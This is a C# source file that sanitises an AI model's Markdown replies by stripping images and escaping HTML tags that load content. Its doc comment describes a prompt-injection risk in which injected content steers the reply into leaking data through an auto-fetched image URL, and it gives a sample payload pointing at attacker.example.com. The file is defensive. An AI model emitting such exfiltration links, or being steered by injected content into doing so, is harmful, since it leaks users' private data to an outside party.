using System.Text.RegularExpressions;

namespace Margo.Cloud.Orchestrator;

/// <summary>
/// Makes the model's reply safe to send as Markdown. A client that renders the reply fetches every image in it
/// without a click, so a reply steered by injected content could carry data out in an image URL
/// (<c>![x](https://attacker.example.com/?d=...)</c>). Images, and HTML that loads something by itself, are therefore
/// replaced by their plain text before the reply leaves; nothing is fetched. Ordinary links are kept: they go nowhere
/// until the manager chooses to follow them, and the manager needs links to their own mail and files.
/// </summary>
public static partial class ReplyText
{
    /// <summary>What stands in for an image that had no alternative text.</summary>
    public const string ImagePlaceholder = "(image removed)";

    /// <summary>
    /// The reply with every Markdown image (<c>![alt](url)</c>, <c>![alt][ref]</c>, <c>![alt]</c>) replaced by its
    /// alternative text, every <c>&lt;img&gt;</c> tag by its <c>alt</c> text, and the opening of any other HTML tag
    /// that loads or runs something by itself (<c>iframe</c>, <c>video</c>, <c>script</c>, ...) written as text.
    /// </summary>
    public static string Neutralise(string text)
    {
        ArgumentNullException.ThrowIfNull(text);
        if (!text.Contains('!', StringComparison.Ordinal) && !text.Contains('<', StringComparison.Ordinal))
        {
            return text;
        }

        // Repeated: removing an inner image can complete an outer one ("![a![b](u)](v)").
        string before;
        var passes = 0;
        do
        {
            before = text;
            text = MarkdownImage().Replace(text, match => Shown(match.Groups["alt"].Value));
        }
        while (text != before && ++passes < 8);

        text = ImageTag().Replace(text, match => Shown(AltAttribute().Match(match.Value) is { Success: true } alt
            ? alt.Groups["double"].Value + alt.Groups["single"].Value + alt.Groups["bare"].Value : ""));
        return LoadingTag().Replace(text, "&lt;$1");
    }

    private static string Shown(string alt)
    {
        alt = alt.Trim();
        return alt.Length == 0 ? ImagePlaceholder : alt;
    }

    /// <summary><c>![alt](destination "title")</c>, <c>![alt][reference]</c>, or a bare <c>![alt]</c> (a shortcut reference).</summary>
    [GeneratedRegex(@"!\[(?<alt>[^\[\]]*)\](?:[ \t]*\((?:[^()\n]|\([^()\n]*\))*\)|[ \t]*\[[^\]\n]*\])?", RegexOptions.CultureInvariant)]
    private static partial Regex MarkdownImage();

    [GeneratedRegex(@"<\s*img\b[^>]*>?", RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex ImageTag();

    [GeneratedRegex(@"\balt\s*=\s*(?:""(?<double>[^""]*)""|'(?<single>[^']*)'|(?<bare>[^\s>""']+))", RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex AltAttribute();

    [GeneratedRegex(@"<(\s*/?\s*(?:iframe|frame|video|audio|source|track|embed|object|picture|svg|image|link|style|script|meta|base|form|input|button|body|html)\b)",
                    RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex LoadingTag();
}
